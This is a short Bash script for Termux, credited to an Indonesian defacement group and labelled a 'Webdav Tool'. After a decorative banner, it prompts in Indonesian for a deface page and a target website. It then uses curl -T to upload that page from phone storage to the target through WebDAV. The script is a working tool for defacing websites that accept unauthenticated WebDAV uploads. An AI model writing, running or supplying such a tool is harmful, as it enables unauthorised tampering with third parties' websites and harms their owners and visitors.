#!bin/bash
#webdav


clear
blue='\e[1;34m'
green='\e[1;32m'
purple='\e[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'
white='\e[1;37m'
yellow='\e[1;33m'
NOW=`date "+%d.%m.%Y"`
TIME=`date "+%H:%M"`
cowsay -f eyes Kota Cilacap | lolcat
toilet -f standard " WEBDAV " -F gay
echo -e $blue'======================================================'
echo Webdav Tool | lolcat
echo -e $red'======================================================'
echo Username-: Red - z1 feat T364R | lolcat
echo Password-: xxxxxxx | lolcat
echo Group----: Indonesian Error System | lolcat
echo Forum----: Cilacap Region | lolcat
echo -e $yellow'======================================================'
date | lolcat
echo -e $green'======================================================'
echo ""
echo "Script Depes harus di luar memori internal"
read -p "Masukan Nama script deface: " script;
read -p "Masukan Web deface: " web;
sleep 4
echo "Tunggu......"
sleep 2
termux-setup-storage
curl -T /storage/emulated/0/$script $web
echo "Succes"
